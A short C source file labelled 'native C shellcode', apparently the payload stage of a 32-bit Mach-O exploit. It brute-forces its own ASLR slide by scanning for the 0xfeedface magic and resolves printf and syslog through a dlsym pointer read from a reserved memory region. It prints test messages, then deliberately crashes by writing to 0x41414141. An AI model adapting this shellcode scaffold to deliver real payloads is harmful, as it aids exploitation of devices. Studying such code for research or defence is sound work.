#pragma optimize("", off)

/*
 *  native C shellcode
 */

typedef unsigned int uint32_t;

#define MAX_SLIDE 0x3
#define MIN_SLIDE 0x1
#define UNSLID_BASE 0x4000
#define RESERVE_ADDR 0x1a0000
#define RTLD_DEFAULT 0xfffffffe
#define LOG_SYSLOG 0x28

//#define PRINTF_ADDR 0x2054a3b9
//#define BASE_ADDR 0x42000000

#define printf(...) do {	\
	uint32_t _get_our_slide(void);	\
	uint32_t (*__get_our_slide)(void) = &_get_our_slide;	\
	uint32_t __slid_base = 0x4000 + (__get_our_slide() << 12);	\
	uint32_t __shc_slide = *(uint32_t*)(RESERVE_ADDR + __slid_base - 0x4000 + 20);	\
	uint32_t __dlsym_addy = *(uint32_t*)(RESERVE_ADDR + __slid_base - 0x4000 + 24);	\
	void* (*__dlsym)(void* handle, const char* symbol) = __dlsym_addy + __shc_slide;	\
	int (*__printf)(char* s, ...) = (int (*)(char*, ...))__dlsym(RTLD_DEFAULT, "printf");	\
	__printf(__VA_ARGS__);	\
} while (0)

#define syslog(...) do {	\
	uint32_t _get_our_slide(void);	\
	uint32_t (*__get_our_slide)(void) = &_get_our_slide;	\
	uint32_t __slid_base = 0x4000 + (__get_our_slide() << 12);	\
	uint32_t __shc_slide = *(uint32_t*)(RESERVE_ADDR + __slid_base - 0x4000 + 20);	\
	uint32_t __dlsym_addy = *(uint32_t*)(RESERVE_ADDR + __slid_base - 0x4000 + 24);	\
	void* (*__dlsym)(void* handle, const char* symbol) = __dlsym_addy + __shc_slide;	\
	void (*__syslog)(int, char* s) = (void (*)(int, char*))__dlsym(RTLD_DEFAULT, "syslog");	\
	__syslog(__VA_ARGS__);	\
} while (0)

void entry(void) {
	int i = 0;
	uint32_t _get_our_slide(void);
	uint32_t (*get_our_slide)(void) = &_get_our_slide;
	while (i < 0x100) {
		__asm__ volatile("nop");
		i++;
	}
	printf("we out here\n");
	printf("gos=%x %x\n", get_our_slide, &i);
	printf("hello from native C, i=%d, slide = 0x%x\n", i, get_our_slide());
	syslog(LOG_SYSLOG, "we out here in native C");
	*(uint32_t*)0x41414141 = i;
}

uint32_t _get_our_slide(void) {
	uint32_t slide = MAX_SLIDE;
//	int (*printf)(char* s, ...) = 0x24da63b9;
//	printf("second function\n");
	for (slide = MAX_SLIDE; slide >= MIN_SLIDE; slide--) {
		if (*(uint32_t*)(UNSLID_BASE + (slide << 12)) == 0xfeedface) {
			return slide;
		}
	}
}